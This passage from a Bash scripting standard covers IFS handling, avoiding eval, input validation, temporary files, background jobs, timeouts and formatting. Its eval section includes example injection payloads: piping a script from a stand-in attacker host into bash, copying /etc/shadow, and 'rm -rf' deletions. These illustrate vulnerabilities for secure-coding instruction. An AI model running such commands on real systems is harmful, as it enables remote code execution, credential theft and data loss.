# IFS with read -d (null-delimited input from find -print0)
while IFS= read -r -d '' file; do
  process "$file"
done < <(find . -type f -print0)

# Empty IFS disables field splitting entirely
IFS=''
data="one two three"
read -ra words <<< "$data"
# Result: words=("one two three")  # NOT split!

# Preserve leading/trailing whitespace
IFS= read -r line < file.txt
```

**Anti-patterns:**

```bash
# ✗ Wrong - modifying IFS without save/restore
IFS=','
read -ra fields <<< "$csv_data"
# IFS is now ',' for the rest of the script - BROKEN!

# ✗ Wrong - trusting inherited IFS
#!/bin/bash
set -euo pipefail
# No IFS protection - vulnerable to manipulation!
read -ra parts <<< "$user_input"

# ✓ Correct - set IFS explicitly
IFS=$' \t\n'
readonly IFS

# ✗ Wrong - forgetting to restore IFS in error cases
saved_ifs="$IFS"
IFS=','
some_command || return 1  # IFS not restored on error!
IFS="$saved_ifs"

# ✓ Correct - use subshell for error safety
(
  IFS=','
  some_command || return 1
)

# ✗ Wrong - modifying IFS globally for loop
IFS=$'\n'
for line in $(cat file.txt); do
  process "$line"
done
# Now ALL subsequent operations use wrong IFS!

# ✓ Correct - isolate IFS change
while IFS= read -r line; do
  process "$line"
done < file.txt
```

**Complete Safe Example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

IFS=$' \t\n'
readonly IFS
export IFS

parse_csv_line() {
  local -- csv_line=$1
  local -a fields

  # IFS applies only to this read command
  IFS=',' read -ra fields <<< "$csv_line"

  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

main() {
  parse_csv_line 'apple,banana,orange'
}

main "$@"

#fin
```

**Testing IFS Safety:**

```bash
test_ifs_safety() {
  local -- original_ifs="$IFS"
  IFS='/'  # Set malicious IFS

  parse_csv_line "apple,banana,orange"

  if [[ "$IFS" == "$original_ifs" ]]; then
    success 'IFS properly protected'
  else
    error 'IFS leaked - security vulnerability!'
    return 1
  fi
}
```

**Summary:**
- **Set IFS explicitly** at script start: `IFS=$' \t\n'; readonly IFS`
- **Use one-line assignment** for single commands: `IFS=',' read -ra fields <<< "$data"`
- **Use local IFS** in functions: `local -- IFS; IFS=','`
- **Use subshells** for error-safe isolation
- **Always restore IFS** if modifying globally
- **Never trust inherited IFS**


---


**Rule: BCS1004**

## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary—almost every use case has a safer alternative.**

**Rationale:**
- **Code Injection**: `eval` executes arbitrary code with full script privileges—complete system compromise if input is attacker-controlled
- **No Sandboxing**: Bypasses all validation; dynamic code construction makes security review nearly impossible
- **Better Alternatives Exist**: Arrays, indirect expansion, and associative arrays handle all common use cases safely

**Understanding eval:**

`eval` takes a string, performs all expansions, then executes the result—performing expansion TWICE:

```bash
var='$(whoami)'
eval "echo $var"  # First: echo $(whoami) �' Second: executes whoami!
```

**Attack Examples:**

```bash
# 1. Direct Command Injection - script does: eval "$user_input"
./script.sh 'curl https://attacker.com/backdoor.sh | bash'

# 2. Variable Name Injection - script does: eval "$var_name='$var_value'"
./script.sh 'x=$(rm -rf /important/data)' 'ignored'  # Command substitution executes!

# 3. Log Injection - eval used in logging
./script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
```

**Safe Alternative 1: Arrays for Command Construction**

```bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path="$1"
  local -- file_pattern="$2"
  local -a cmd

  cmd=(find "$search_path" -type f -name "$file_pattern")
  "${cmd[@]}"  # Execute array safely - no injection possible
}
```

**Safe Alternative 2: Indirect Expansion for Variable References**

```bash
# ✗ Wrong - using eval
eval "value=\\$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"

# ✓ Correct - for assignment
printf -v "$var_name" '%s' "$value"
```

**Safe Alternative 3: Associative Arrays for Dynamic Data**

```bash
# ✗ Wrong - eval to create dynamic variables
for i in {1..5}; do
  eval "var_$i='value $i'"
done

# ✓ Correct - associative array
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done
```

**Safe Alternative 4: Case/Arrays for Function Dispatch**

```bash
# ✗ Wrong - eval to select function
eval "${action}_function"

# ✓ Correct - case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Also correct - array lookup
declare -A actions=([start]=start_function [stop]=stop_function)
if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
fi
```

**Safe Alternative 5: Command Substitution for Output Capture**

```bash
# ✗ Wrong
eval "output=\$($cmd)"

# ✓ Correct - if command is in variable, use array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Validate Before Parsing**

```bash
# ✗ Wrong - eval for parsing
eval "$config_line"

# ✓ Correct - validate key before assignment
IFS='=' read -r key value <<< "$config_line"
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
```

**Safe Alternative 7: Arithmetic Expansion**

```bash
# ✗ Wrong - eval for arithmetic
eval "result=$((user_expr))"

# ✓ Correct - validate first
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
fi

# ✓ Better - use bc for isolation
result=$(bc <<< "$user_expr")
```

**Edge Cases: When eval seems necessary**

```bash
# Dynamic variable names in loops - use associative array instead
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done

# Building complex commands - use array instead
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
"${cmd[@]}"

# Config sourcing - validate first
if grep -qE '(eval|exec|`|\$\()' config.txt; then
  die 1 'Config file contains dangerous patterns'
fi
source config.txt
```

**Anti-patterns:**

```bash
# ✗ Wrong - eval with user input | ✓ Correct - whitelist
eval "$user_command"            | case "$user_command" in start|stop) ... esac

# ✗ Wrong - eval assignment     | ✓ Correct - printf -v
eval "$var='$val'"              | printf -v "$var" '%s' "$val"

# ✗ Wrong - double expansion    | ✓ Correct - indirect expansion
eval "echo \$$var_name"         | echo "${!var_name}"

# ✗ Wrong - check if set        | ✓ Correct - -v test
eval "if [[ -n \\$$var ]]; ..."  | if [[ -v "$var" ]]; then ...
```

**Detecting eval usage:**

```bash
grep -rn 'eval.*\$' /path/to/scripts/  # Find dangerous eval with variables
shellcheck -x script.sh                 # SC2086 warns about eval misuse
```

**Key principle:** If you think you need `eval`, you're solving the wrong problem. Use arrays for commands, indirect expansion for variable references, associative arrays for dynamic data, and case statements for dispatch.


---


**Rule: BCS1005**

## Input Sanitization

**Always validate and sanitize user input to prevent security issues.**

**Rationale:**
- Prevent injection attacks (malicious code in input)
- Prevent directory traversal (`../../../etc/passwd`)
- Validate data types match expected format
- Fail early - reject invalid input before processing
- Defense in depth - never trust user input

**1. Filename validation:**

```bash
sanitize_filename() {
  local -- name=$1

  [[ -n "$name" ]] || die 22 'Filename cannot be empty'

  name="${name//\.\./}"  # Remove all ..
  name="${name//\//}"    # Remove all /

  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || die 22 "Invalid filename ${name@Q}: contains unsafe characters"
  [[ "$name" =~ ^\\. ]] && die 22 "Filename cannot start with dot ${name@Q}"
  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars) ${name@Q}"

  echo "$name"
}

user_filename=$(sanitize_filename "$user_input")
safe_path="$SAFE_DIR/$user_filename"
```

**2. Numeric input validation:**

```bash
validate_integer() {
  local -- input=$1
  [[ -n "$input" ]] || die 22 'Number cannot be empty'
  [[ "$input" =~ ^-?[0-9]+$ ]] || die 22 "Invalid integer: '$input'"
  echo "$input"
}

validate_positive_integer() {
  local -- input=$1
  [[ -n "$input" ]] || die 22 'Number cannot be empty'
  [[ "$input" =~ ^[0-9]+$ ]] || die 22 "Invalid positive integer: '$input'"
  [[ "$input" =~ ^0[0-9] ]] && die 22 "Number cannot have leading zeros: $input"
  echo "$input"
}

validate_port() {
  local -- port="$1"
  port=$(validate_positive_integer "$port")
  ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
  echo "$port"
}
```

**3. Path validation:**

```bash
validate_path() {
  local -- input_path=$1
  local -- allowed_dir=$2

  local -- real_path
  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path ${input_path@Q}"

  [[ "$real_path" != "$allowed_dir"* ]] && die 5 "Path outside allowed directory ${real_path@Q}"

  echo "$real_path"
}

safe_path=$(validate_path "$user_path" "/var/app/data")
```

**4. Email validation:**

```bash
validate_email() {
  local -- email=$1
  [[ -n "$email" ]] || die 22 'Email cannot be empty'

  local -- email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
  [[ "$email" =~ $email_regex ]] || die 22 "Invalid email format: $email"
  ((${#email} <= 254)) || die 22 "Email too long (max 254 chars): $email"

  echo "$email"
}
```

**5. URL validation:**

```bash
validate_url() {
  local -- url=$1
  [[ -n "$url" ]] || die 22 'URL cannot be empty'
  [[ "$url" =~ ^https?:// ]] || die 22 "URL must start with http:// or https://: ${url@Q}"
  [[ "$url" =~ @ ]] && die 22 'URL cannot contain credentials'
  echo "$url"
}
```

**6. Whitelist validation:**

```bash
validate_choice() {
  local -- input=$1
  shift
  local -a valid_choices=("$@")

  local choice
  for choice in "${valid_choices[@]}"; do
    [[ "$input" == "$choice" ]] && return 0
  done

  die 22 "Invalid choice ${input@Q}. Valid: ${valid_choices[*]}"
}

declare -a valid_actions=('start' 'stop' 'restart' 'status')
validate_choice "$user_action" "${valid_actions[@]}"
```

**7. Username validation:**

```bash
validate_username() {
  local -- username="$1"
  [[ -n "$username" ]] || die 22 'Username cannot be empty'
  [[ "$username" =~ ^[a-z_][a-z0-9_-]*$ ]] || die 22 "Invalid username ${username@Q}"
  ((${#username} >= 1 && ${#username} <= 32)) || die 22 "Username must be 1-32 characters ${username@Q}"
  echo "$username"
}
```

**8. Command injection prevention:**

```bash
# ✗ DANGEROUS - command injection vulnerability
user_file="$1"
cat "$user_file"  # If user_file="; rm -rf /", disaster!

# ✓ Safe - validate first
validate_filename "$user_file"
cat -- "$user_file"  # Use -- to prevent option injection

# ✗ DANGEROUS - using eval with user input
eval "$user_command"  # NEVER DO THIS!

# ✓ Safe - whitelist allowed commands
case "$user_command" in
  start|stop|restart) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac
```

**9. Option injection prevention:**

```bash
user_file=$1

# ✗ Dangerous - if user_file="--delete-all", disaster!
rm "$user_file"

# ✓ Safe - use -- separator
rm -- "$user_file"

# ✗ Dangerous - filename starting with -
ls "$user_file"  # If user_file="-la", becomes: ls -la

# ✓ Safe - use -- or prepend ./
ls -- "$user_file"
ls ./"$user_file"
```

**10. SQL injection prevention:**

```bash
# ✗ DANGEROUS - SQL injection vulnerability
user_id=$1
query="SELECT * FROM users WHERE id=$user_id"  # user_id="1 OR 1=1"

# ✓ Safe - validate input type first
user_id=$(validate_positive_integer "$user_id")
query="SELECT * FROM users WHERE id=$user_id"
```

**Anti-patterns:**

```bash
# ✗ WRONG - trusting user input
rm -rf "$user_dir"  # user_dir="/" = disaster!

# ✓ Correct - validate first
validate_path "$user_dir" "/safe/base/dir"
rm -rf "$user_dir"

# ✗ WRONG - weak validation
[[ -n "$filename" ]] && process "$filename"  # Not enough!

# ✓ Correct - thorough validation
filename=$(sanitize_filename "$filename")
process "$filename"

# ✗ WRONG - blacklist approach (always incomplete)
[[ "$input" != *'rm'* ]] || die 1 'Invalid input'  # Can be bypassed!

# ✓ Correct - whitelist approach
[[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
```

**Security principles:**

1. **Whitelist over blacklist**: Define what IS allowed, not what isn't
2. **Validate early**: Check input before any processing
3. **Fail securely**: Reject invalid input with clear error
4. **Use `--` separator**: Prevent option injection in commands
5. **Never use `eval`**: Especially not with user input
6. **Absolute paths**: Use full paths to prevent PATH manipulation
7. **Principle of least privilege**: Run with minimum necessary permissions


---


**Rule: BCS1006**

## Temporary File Handling

**Always use `mktemp` to create temporary files and directories, never hard-code temp file paths. Use trap handlers to ensure cleanup occurs even on script failure or interruption. Store temp file paths in variables, make them readonly when possible, and always clean up in EXIT trap.**

**Rationale:**
- **Security**: mktemp creates files with secure permissions (0600) in safe locations
- **Uniqueness**: Guaranteed unique filenames prevent collisions
- **Atomicity**: mktemp creates file atomically, preventing race conditions
- **Cleanup Guarantee**: EXIT trap ensures cleanup even on failure/interruption
- **Portability**: mktemp works consistently across Unix-like systems

**Basic temp file creation:**

```bash
# ✓ CORRECT - Create temp file and ensure cleanup
create_temp_file() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  echo 'Test data' > "$temp_file"
}
```

**Basic temp directory creation:**

```bash
# ✓ CORRECT - Create temp directory and ensure cleanup
create_temp_dir() {
  local -- temp_dir

  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'
  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  echo 'file1' > "$temp_dir"/file1.txt
}
```

**Custom temp file templates:**

```bash
# Template: myapp.XXXXXX (at least 3 X's required)
temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX) ||
  die 1 'Failed to create temporary file'
trap 'rm -f "$temp_file"' EXIT
# Output example: /tmp/myscript.Ab3X9z

# Temp file with extension (mktemp doesn't support extensions directly)
temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
mv "$temp_file" "$temp_file".json
temp_file="$temp_file".json
trap 'rm -f "$temp_file"' EXIT
```

**Multiple temp files with cleanup:**

```bash
# Global array for temp files
declare -a TEMP_FILES=()

cleanup_temp_files() {
  local -i exit_code=$?
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    if [[ -f "$file" ]]; then
      rm -f "$file"
    elif [[ -d "$file" ]]; then
      rm -rf "$file"
    fi
  done

  return "$exit_code"
}

trap cleanup_temp_files EXIT

# Create and register temp file
create_temp() {
  local -- temp_file
  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  TEMP_FILES+=("$temp_file")
  echo "$temp_file"
}
```

**Temp file security validation:**

```bash
# ✓ CORRECT - Robust temp file creation with validation
create_temp_robust() {
  local -- temp_file

  if ! temp_file=$(mktemp 2>&1); then
    die 1 "Failed to create temporary file ${temp_file@Q}"
  fi

  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file does not exist ${temp_file@Q}"
  fi

  # Check permissions (should be 0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file
  echo "$temp_file"
}
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - Hard-coded temp file path (not unique, predictable, no cleanup)
temp_file=/tmp/myapp_temp.txt

# ✗ WRONG - Using PID in filename (still predictable, race condition)
temp_file=/tmp/myapp_"$$".txt

# ✗ WRONG - No cleanup trap
temp_file=$(mktemp)
echo 'data' > "$temp_file"
# Script exits, temp file remains!

# ✗ WRONG - Cleanup in script body (fails if script fails before rm)
temp_file=$(mktemp)
echo 'data' > "$temp_file"
rm -f "$temp_file"

# ✗ WRONG - Creating temp file manually (not atomic, race conditions)
temp_file="/tmp/myapp_$(date +%s).txt"
touch "$temp_file"
chmod 600 "$temp_file"

# ✗ WRONG - Insecure permissions
temp_file=$(mktemp)
chmod 666 "$temp_file"  # World writable!

# ✗ WRONG - Not checking mktemp success
temp_file=$(mktemp)
echo 'data' > "$temp_file"  # May fail if mktemp failed!

# ✗ WRONG - Multiple traps overwrite each other
temp1=$(mktemp)
trap 'rm -f "$temp1"' EXIT
temp2=$(mktemp)
trap 'rm -f "$temp2"' EXIT  # Overwrites previous trap!

# ✓ CORRECT - Single trap for all cleanup
temp1=$(mktemp) || die 1 'Failed to create temp file'
temp2=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp1" "$temp2"' EXIT

# ✗ WRONG - Removing temp directory without -r
temp_dir=$(mktemp -d)
trap 'rm "$temp_dir"' EXIT  # Fails if directory not empty!

# ✓ CORRECT - Use -rf for directories
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**Edge cases:**

**1. Preserving temp files for debugging:**

```bash
declare -i KEEP_TEMP=0
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=$?
  local -- file

  if ((KEEP_TEMP)); then
    info 'Keeping temp files for debugging:'
    for file in "${TEMP_FILES[@]}"; do
      info "  $file"
    done
  else
    for file in "${TEMP_FILES[@]}"; do
      [[ -f "$file" ]] && rm -f "$file" ||:
      [[ -d "$file" ]] && rm -rf "$file" ||:
    done
  fi

  return "$exit_code"
}

trap cleanup EXIT
```

**2. Temp files in specific directory:**

```bash
# Create temp file in specific directory
temp_file=$(mktemp "$SCRIPT_DIR"/temp.XXXXXX) ||
  die 1 'Failed to create temp file in script directory'
trap 'rm -f "$temp_file"' EXIT

# Create temp directory in specific location
temp_dir=$(mktemp -d "$HOME"/work/temp.XXXXXX) ||
  die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**3. Handling signals:**

```bash
declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?
  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    rm -f "$TEMP_FILE"
  fi
  return "$exit_code"
}

# Cleanup on normal exit and signals
trap cleanup EXIT SIGINT SIGTERM
```

**Summary:**
- **Always use mktemp** - never hard-code temp file paths
- **Use trap for cleanup** - ensure cleanup happens even on failure
- **EXIT trap is mandatory** - automatic cleanup when script ends
- **Check mktemp success** - `|| die` to handle creation failure
- **Default permissions are secure** - mktemp creates 0600 files, 0700 directories
- **Use cleanup function pattern** - for multiple temp files/directories
- **Handle signals** - trap SIGINT SIGTERM for interruption cleanup


---


**Rule: BCS1100**

# Concurrency & Jobs

Parallel execution patterns, background job management, and robust waiting strategies for Bash 5.2+.

**5 Rules:**

1. **Background Jobs** (BCS1101) - Managing `&`, process groups, and cleanup
2. **Parallel Execution** (BCS1102) - Running tasks concurrently with output capture
3. **Wait Patterns** (BCS1103) - `wait -n`, error collection, selective waiting
4. **Timeout Handling** (BCS1104) - Using `timeout` command, exit codes 124/125
5. **Exponential Backoff** (BCS1105) - Retry patterns with increasing delays

**Key principle:** Always clean up background jobs and handle partial failures gracefully.


---


**Rule: BCS1101**

## Background Job Management

**Rule: BCS1406**

Managing background processes, job control, and process lifecycle.

---

#### Rationale

Background jobs enable non-blocking execution, parallel processing, responsive scripts handling multiple tasks, and proper resource cleanup on termination.

---

#### Starting Background Jobs

```bash
# Basic background execution
long_running_command &
declare -i pid=$!

# Track multiple jobs
declare -a pids=()
for file in "${files[@]}"; do
  process_file "$file" &
  pids+=($!)
done
```

#### Checking Process Status

```bash
# Check if process is running (signal 0 = existence check)
if kill -0 "$pid" 2>/dev/null; then
  info "Process $pid is still running"
fi

# Get process state from /proc
if [[ -d /proc/"$pid" ]]; then
  state=$(< /proc/"$pid"/stat)
fi
```

#### Waiting for Jobs

```bash
wait "$pid"        # Wait for specific PID
exit_code=$?
wait               # Wait for all background jobs
wait -n            # Wait for any job to complete (Bash 4.3+)
```

#### Cleanup Pattern

```bash
declare -a PIDS=()

cleanup() {
  local -i exitcode=${1:-0}
  trap - SIGINT SIGTERM EXIT  # Prevent recursion

  # Kill any remaining background jobs
  for pid in "${PIDS[@]}"; do
    kill "$pid" 2>/dev/null || true
  done

  exit "$exitcode"
}
trap 'cleanup $?' SIGINT SIGTERM EXIT

# Start jobs
for task in "${tasks[@]}"; do
  run_task "$task" &
  PIDS+=($!)
done

# Wait for completion
for pid in "${PIDS[@]}"; do
  wait "$pid" || true
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no PID tracking (cannot manage later)
command &

# ✓ Correct - always track PIDs
command &
pid=$!

# ✗ Wrong - $$ is parent PID, not child
command &
echo "Started $$"

# ✓ Correct - use $! for last background PID
command &
echo "Started $!"
```

---

**See Also:** BCS1407 (Parallel Execution), BCS1408 (Wait Patterns), BCS1409 (Timeout Handling)


---


**Rule: BCS1102**

## Parallel Execution Patterns

**Rule: BCS1407**

Concurrent command execution with control and result collection.

---

#### Rationale

Parallel execution enables speedup for I/O-bound tasks, better resource utilization, and efficient batch processing.

---

#### Basic Parallel Pattern

```bash
declare -a pids=()

# Start jobs in parallel
for server in "${servers[@]}"; do
  run_command "$server" "$@" &
  pids+=($!)
done

# Wait for all to complete
for pid in "${pids[@]}"; do
  wait "$pid" || true
done
```

#### Parallel with Output Capture

```bash
declare -- temp_dir
temp_dir=$(mktemp -d)
trap 'rm -rf "$temp_dir"' EXIT

declare -a pids=()

for server in "${servers[@]}"; do
  {
    result=$(run_command "$server" 2>&1)
    echo "$result" > "$temp_dir/$server.out"
  } &
  pids+=($!)
done

# Wait then display in order
for pid in "${pids[@]}"; do
  wait "$pid" || true
done

# Output results in original order
for server in "${servers[@]}"; do
  [[ -f "$temp_dir"/"$server".out ]] && cat "$temp_dir"/"$server".out
done
```

#### Parallel with Concurrency Limit

```bash
declare -i max_jobs=4
declare -a pids=()

for task in "${tasks[@]}"; do
  # Wait if at max concurrency
  while ((${#pids[@]} >= max_jobs)); do
    wait -n 2>/dev/null || true
    # Remove completed PIDs
    local -a active=()
    for pid in "${pids[@]}"; do
      kill -0 "$pid" 2>/dev/null && active+=("$pid")
    done
    pids=("${active[@]}")
  done

  process_task "$task" &
  pids+=($!)
done

# Wait for remaining
wait
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - variable lost in subshell
count=0
for task in "${tasks[@]}"; do
  { process "$task"; count+=1; } &
done
wait
echo "$count"  # Always 0!

# ✓ Correct - use temp files for results
for task in "${tasks[@]}"; do
  { process "$task" && echo 1 >> "$temp_dir"/count; } &
done
wait
count=$(wc -l < "$temp_dir"/count)
```

---

**See Also:** BCS1406 (Background Jobs), BCS1408 (Wait Patterns)


---


**Rule: BCS1103**

## Wait Patterns

**Rule: BCS1408**

Proper synchronization when waiting for background processes.

---

#### Rationale

Ensures resource cleanup, exit code capture, no hanging on failures, graceful interrupt handling.

---

#### Basic Wait

```bash
# Wait for specific PID and capture exit code
command &
pid=$!
wait "$pid"
exit_code=$?
```

#### Wait for All Jobs

```bash
# Wait for all background jobs
wait

# With error tracking
declare -i errors=0
for pid in "${pids[@]}"; do
  wait "$pid" || ((errors+=1))
done
((errors)) && warn "$errors jobs failed"
```

#### Wait for Any (Bash 4.3+)

```bash
# Wait for first job to complete
declare -a pids=()
for task in "${tasks[@]}"; do
  process_task "$task" &
  pids+=($!)
done

# Process as they complete
while ((${#pids[@]} > 0)); do
  wait -n
  exit_code=$?
  # Handle completion...

  # Update active PIDs list
  local -a active=()
  for pid in "${pids[@]}"; do
    kill -0 "$pid" 2>/dev/null && active+=("$pid")
  done
  pids=("${active[@]}")
done
```

#### Wait with Error Collection

```bash
declare -A exit_codes=()

for server in "${servers[@]}"; do
  run_command "$server" &
  exit_codes[$server]=$!
done

declare -i failures=0
for server in "${!exit_codes[@]}"; do
  pid=${exit_codes[$server]}
  if ! wait "$pid"; then
    exit_codes[$server]=$?
    ((failures+=1))
  else
    exit_codes[$server]=0
  fi
done

((failures)) && error "$failures servers failed"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - ignoring wait return value
command &
wait $!  # Exit code lost

# ✓ Correct - capture and use exit code
command &
wait $! || die 1 'Command failed'
```

---

**See Also:** BCS1406 (Background Jobs), BCS1407 (Parallel Execution)


---


**Rule: BCS1104**

## Timeout Handling

**Rule: BCS1409**

Managing command timeouts and handling timeout conditions gracefully.

---

#### Rationale

Timeout handling prevents scripts hanging on unresponsive commands, resource exhaustion from stuck processes, poor user experience, and cascading failures in automated systems.

---

#### Basic Timeout

```bash
# Simple timeout (coreutils)
if timeout 30 long_running_command; then
  success 'Command completed'
else
  exit_code=$?
  if ((exit_code == 124)); then
    warn 'Command timed out'
  else
    error "Command failed with exit code $exit_code"
  fi
fi
```

#### Timeout with Signal Selection

```bash
# Send SIGTERM first, SIGKILL after grace period
timeout --signal=TERM --kill-after=10 60 command

# Exit codes: 124=timed out, 125=timeout failed, 126=not executable, 127=not found, 137=SIGKILL
```

#### Timeout with Variable Duration

```bash
declare -i TIMEOUT=${TIMEOUT:-30}

run_with_timeout() {
  local -i timeout_sec=$1; shift

  if ! timeout "${timeout_sec}s" "$@"; then
    local -i exit_code=$?
    case $exit_code in
      124) warn "Timed out after ${timeout_sec}s" ;;
      125) error 'Timeout command failed' ;;
      *)   error "Failed with exit code $exit_code" ;;
    esac
    return "$exit_code"
  fi
}

run_with_timeout "$TIMEOUT" ssh "$server" "$command"
```

#### Read with Timeout

```bash
if read -r -t 10 -p 'Enter value: ' value; then
  info "Got: $value"
else
  warn 'Input timed out, using default'
  value='default'
fi
```

#### Connection Timeout Pattern

```bash
ssh -o ConnectTimeout=10 -o BatchMode=yes "$server" "$command"
curl --connect-timeout 10 --max-time 60 "$url"
```

---

#### Anti-Pattern

```bash
# ✗ Wrong - no timeout on network operations
ssh "$server" 'long_command'  # May hang forever

# ✓ Correct - always timeout network operations
timeout 300 ssh -o ConnectTimeout=10 "$server" 'long_command'
```

---

**See Also:** BCS1410 (Exponential Backoff)


---


**Rule: BCS1105**

## Exponential Backoff

**Rule: BCS1410**

Retry logic with exponential delay for transient failures.

---

#### Rationale

- Graceful transient failure handling with automatic recovery
- Reduced load on failing services; configurable retry behavior

---

#### Basic Exponential Backoff

```bash
retry_with_backoff() {
  local -i max_attempts=${1:-5}
  local -i attempt=1
  shift

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i delay=$((2 ** attempt))
    warn "Attempt $attempt failed, retrying in ${delay}s..."
    sleep "$delay"
    attempt+=1
  done

  error "Failed after $max_attempts attempts"
  return 1
}

retry_with_backoff 5 curl -f "$url"
```

#### With Maximum Delay Cap

```bash
retry_with_backoff() {
  local -i max_attempts=5
  local -i max_delay=60
  local -i attempt=1

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i delay=$((2 ** attempt))
    ((delay > max_delay)) && delay=$max_delay ||:

    ((VERBOSE)) && info "Retry $attempt in ${delay}s..." ||:
    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

#### With Jitter (Randomization)

```bash
# Add randomization to prevent thundering herd
retry_with_jitter() {
  local -i max_attempts=5
  local -i attempt=1

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i base_delay=$((2 ** attempt))
    local -i jitter=$((RANDOM % base_delay))
    local -i delay=$((base_delay + jitter))

    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - fixed delay
while ! command; do
  sleep 5  # Same delay every time
done

# ✓ Correct - exponential backoff
declare -i attempt=1
while ! command; do
  sleep $((2 ** attempt))
  attempt+=1
  ((attempt > 5)) && break
done
```

```bash
# ✗ Wrong - immediate retry floods service
while ! curl "$url"; do :; done

# ✓ Correct - backoff prevents flooding
retry_with_backoff 5 curl -f "$url"
```

---

**See Also:** BCS1409 (Timeout Handling), BCS1406 (Background Jobs)


---


**Rule: BCS1200**

# Style & Development

Code formatting, documentation, and development patterns for maintainable Bash scripts.

**10 Rules:**

1. **Code Formatting** (BCS1201) - Indentation, line length, structure
2. **Comments** (BCS1202) - Comment style and placement
3. **Blank Lines** (BCS1203) - Whitespace for readability
4. **Section Markers** (BCS1204) - Visual section delimiters
5. **Language Practices** (BCS1205) - Bash-specific idioms
6. **Development Practices** (BCS1206) - Version control, testing habits
7. **Debugging** (BCS1207) - Debug output and tracing
8. **Dry-Run Mode** (BCS1208) - Safe preview of destructive operations
9. **Testing** (BCS1209) - Test structure and assertions
10. **Progressive State** (BCS1210) - Multi-stage operation tracking

**Key principle:** Consistent formatting and documentation make scripts maintainable by both humans and AI assistants.


---


**Rule: BCS1201**

## Code Formatting

#### Indentation
- !! Use 2 spaces for indentation (NOT tabs)
- Maintain consistent indentation throughout

#### Line Length
- Keep lines under 100 characters when practical
- Long file paths and URLs can exceed 100 chars when necessary
- Use line continuation with `\` for long commands


---


**Rule: BCS1202**

## Comments

Focus on **WHY** (rationale, business logic, non-obvious decisions) not **WHAT** (code already shows):

```bash
# Section separator (80 dashes)
# --------------------------------------------------------------------------------

# ✓ Good - explains WHY (rationale and special cases)
# PROFILE_DIR intentionally hardcoded to /etc/profile.d for system-wide bash profile
# integration, regardless of PREFIX. This ensures builtins are available in all
# user sessions. To override, modify this line or use a custom install method.
declare -- PROFILE_DIR=/etc/profile.d

((max_depth > 0)) || max_depth=255  # -1 means unlimited (WHY -1 is special)

# ✗ Bad - restates WHAT the code already shows
# Set PROFILE_DIR to /etc/profile.d
declare -- PROFILE_DIR=/etc/profile.d
```

**Good comments:** Non-obvious business rules, intentional pattern deviations, complex logic rationale, chosen approach justification, subtle gotchas/side effects.

**Avoid commenting:** Simple assignments, obvious conditionals, standard patterns, self-explanatory code.

**Documentation icons:** ◉ info | ⦿ debug | ▲ warn | ✓ success | ✗ error


---


**Rule: BCS1203**

## Blank Line Usage

Use blank lines strategically for visual separation between logical blocks:

```bash
#!/bin/bash
set -euo pipefail

# Script metadata
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
                                          # ← Blank line after metadata group

# Default values                          # ← Blank line before section comment
declare -- PREFIX=/usr/local
